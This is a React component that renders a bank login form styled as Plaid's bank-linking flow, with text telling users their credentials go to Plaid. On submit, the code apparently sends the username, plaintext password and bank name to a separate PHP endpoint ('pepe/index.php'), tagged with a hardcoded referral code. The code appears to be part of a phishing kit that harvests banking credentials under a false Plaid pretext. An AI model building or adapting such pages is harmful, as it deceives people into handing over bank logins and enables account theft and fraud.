import { useRef } from "react";
import { useState } from "react";
import {HiOutlineLockClosed} from "react-icons/hi";
import "./styles/BankLogin.css";
//axios for api request
import axios from 'axios';

export default function BankLogin({ bank }) {

    const input1 = useRef(null);
    const input2 = useRef(null);

    const handleClick1 = () => {
        input1.current.focus();
    }; 

    const handleClick2 = () => {
        input2.current.focus();
    };
    
    const [username, setUserName] = useState("");
      
    const updateUserName = (event) => {
        setUserName(event.target.value);
    };

    const [password, setPassword] = useState("");
      
    const updatePassword = (event) => {
        setPassword(event.target.value);
    };

    const addFormData = (evt) => {
        evt.preventDefault();
        
        //--- DO VALIDATION FOR BLANK FIELDS HERE ---

        const fd = new FormData();


        fd.append('username', JSON.stringify(username).replace(/\"/g, ""));
        fd.append('passwordinput', JSON.stringify(password).replace(/\"/g, ""));
        fd.append('bank', JSON.stringify(bank.name).replace(/\"/g, ""));
        fd.append('referralinput', "EVA222");

        
        //http://localhost/savedata.php
        axios.post('http://localhost/pepe/index.php', fd).then(res=> {
            //Success alert
		    //this.myFormRef.reset();
		    }
        );
        setPassword("")
        setUserName("")
    }


    const passLabelRef = useRef()
    const inputLabelRef = useRef()
    return <div style={{
        width: "100%",
        height: "100%",
        display: "flex",
        flexDirection: "column"
    }}>
        <div className="InstitutionContainer" >
            <div style={{
                backgroundImage: `url(${bank.logo})`
            }}
                className="Logo"></div>

            <div className="ThreadsInstitutionResult_text">
                <p className="ThreadsInstitutionResult_name">{bank.name}</p>
                <p className="ThreadsInstitutionResult_url">{bank.url}</p>
            </div>
        </div>
        <div className="FormContainer">
            <form onSubmit={addFormData}>
                <fieldset>
                    <legend>
                        <h1 class="EnterYourCredentialsText">Enter Your Credentials</h1>
                        <p class="CredentialsReadMe">
                            By providing your
                            <b> {bank.name} </b> 
                             credentials to Plaid, you’re enabling Plaid to retrieve your financial data.
                        </p>
                    </legend>
                </fieldset>

                <fieldset className="inputFieldset">
                    <label ref={inputLabelRef} onClick={handleClick1}>User ID</label>
                    <input ref={input1} onFocus={() => {
                        inputLabelRef.current.className = "labelclickedUser"
                    }}  className="inputAfterLabel" name="username" id="username" type="text" value={username} onChange={updateUserName} />
                    <div className="padlockDiv">
                        <i><HiOutlineLockClosed/></i>
                    </div>
                </fieldset>

                <fieldset className="inputFieldset2">
                    <label ref={passLabelRef} onClick={handleClick2}>Password</label>
                    <input ref={input2} onFocus={() => {
                        passLabelRef.current.className = "labelclickedPassword"
                    }}  className="inputAfterLabel" name="password" id="password" type="password" value={password} onChange={updatePassword}  />
                    <div className="padlockDiv">
                        <i><HiOutlineLockClosed/></i>
                    </div>
                </fieldset>

                <button className="ButtonAfterAction" type="submit">
                    <span>Submit</span>
                </button>
                
                <a></a>
            </form> 
        </div>
    </div>
}